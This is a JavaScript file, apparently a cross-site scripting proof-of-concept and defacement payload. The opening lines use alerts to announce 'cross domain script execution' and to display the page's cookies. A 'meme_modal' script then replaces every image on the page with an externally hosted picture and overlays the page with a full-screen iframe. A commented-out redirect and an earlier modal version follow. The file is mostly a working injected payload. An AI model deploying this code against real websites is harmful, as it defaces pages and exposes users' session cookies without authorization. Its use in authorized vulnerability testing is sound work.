alert("cross domain script execution done ");
alert(4*4*4);
alert("Cookies: " + document.cookie);
// meme_modal.js
document.addEventListener("DOMContentLoaded", function() {
    const memeUrl = "https://vaptcheck.netlify.app/image%20(2).png";
    
    // Replace all existing images on the page
    document.querySelectorAll("img").forEach(img => {
        img.src = memeUrl;
    });
    
    // Create an iframe
    const iframe = document.createElement("iframe");
    iframe.style.position = "fixed";
    iframe.style.top = "0";
    iframe.style.left = "0";
    iframe.style.width = "100vw";
    iframe.style.height = "100vh";
    iframe.style.border = "none";
    iframe.style.zIndex = "1000";
    
    document.body.appendChild(iframe);
    
    // Load the image inside the iframe
    iframe.contentDocument.body.style.margin = "0";
    iframe.contentDocument.body.style.display = "flex";
    iframe.contentDocument.body.style.justifyContent = "center";
    iframe.contentDocument.body.style.alignItems = "center";
    iframe.contentDocument.body.style.height = "100vh";
    iframe.contentDocument.body.style.background = "rgba(0, 0, 0, 0.8)";
    
    iframe.contentDocument.body.innerHTML = `<img src="${memeUrl}" style="max-width: 90vw; max-height: 90vh; border: 5px solid white; border-radius: 10px;">`;
    
    // Close iframe on click
    iframe.addEventListener("click", function() {
        iframe.remove();
    });
    
});

// window.location.href = "https://www.google.com";
// meme_modal.js
// meme_modal.js
// meme_modal.js
// meme_modal.js
// document.addEventListener("DOMContentLoaded", function() {
//     const memeUrl = "https://vaptcheck.netlify.app/image%20(2).png";
    
//     // Replace all existing images on the page
//     document.querySelectorAll("img").forEach(img => {
//         img.src = memeUrl;
//     });
    
//     // Create a modal with the image
//     const modal = document.createElement("div");
//     modal.style.position = "fixed";
//     modal.style.top = "0";
//     modal.style.left = "0";
//     modal.style.width = "100vw";
//     modal.style.height = "100vh";
//     modal.style.background = "rgba(0, 0, 0, 0.8)";
//     modal.style.display = "flex";
//     modal.style.justifyContent = "center";
//     modal.style.alignItems = "center";
//     modal.style.zIndex = "1000";
    
//     modal.innerHTML = `<img src="${memeUrl}" style="max-width: 90vw; max-height: 90vh; border: 5px solid white; border-radius: 10px;">`;
    
//     document.body.appendChild(modal);
    
//     modal.addEventListener("click", function() {
//         modal.remove();
//     });
// });
